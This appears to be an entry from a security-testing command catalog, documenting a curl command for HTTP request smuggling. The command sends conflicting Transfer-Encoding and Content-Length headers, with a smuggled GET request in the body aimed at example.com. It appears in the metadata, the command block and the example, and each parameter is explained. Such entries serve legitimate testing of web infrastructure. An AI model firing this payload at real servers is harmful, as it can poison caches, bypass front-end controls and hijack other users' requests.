---
data: >-
  curl -v --include -H "Transfer-Encoding: chunked" -H "Content-Length: 200" -X
  "POST" -d "0\r\n\r\nGET /smuggled HTTP/1.1\r\nHost: example.com\r\n\r\n"
  http://example.com/endpoint
tags:
  - http-smuggling
  - automation
type: command
executor: bash
platforms:
  - Linux
  - Windows
id: 8d729836-92bb-425a-a967-c220f0c44f92
created_at: '2025-12-13T09:01:21.754Z'
updated_at: '2025-12-13T09:01:21.754Z'
verified: false
validated: true
submitted: true
---
# curl-python-automated-test

## Command

```bash
curl -v --include -H "Transfer-Encoding: chunked" -H "Content-Length: 200" -X "POST" -d "0\r\n\r\nGET /smuggled HTTP/1.1\r\nHost: example.com\r\n\r\n" http://example.com/endpoint
```

## Description

Sends a POST request with conflicting headers and smuggled GET, including response headers in output, for use in Python automation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-v` | Verbose output | Yes |
| `--include` | Include response headers in output | Yes |
| `-H "Transfer-Encoding: chunked"` | Set Transfer-Encoding header | Yes |
| `-H "Content-Length: 200"` | Set Content-Length header | Yes |
| `-X "POST"` | Specify POST method | Yes |
| `-d "0\r\n\r\nGET /smuggled HTTP/1.1\r\nHost: example.com\r\n\r\n"` | Data payload with smuggled GET request | Yes |

## Examples

### Basic Usage

```bash
curl -v --include -H "Transfer-Encoding: chunked" -H "Content-Length: 200" -X "POST" -d "0\r\n\r\nGET /smuggled HTTP/1.1\r\nHost: example.com\r\n\r\n" http://example.com/endpoint
```

## Expected Output

STDOUT and STDERR capturing the request and response.

## Related

- [[procedures/Reproduce-Smuggling-with-Python-Script]]
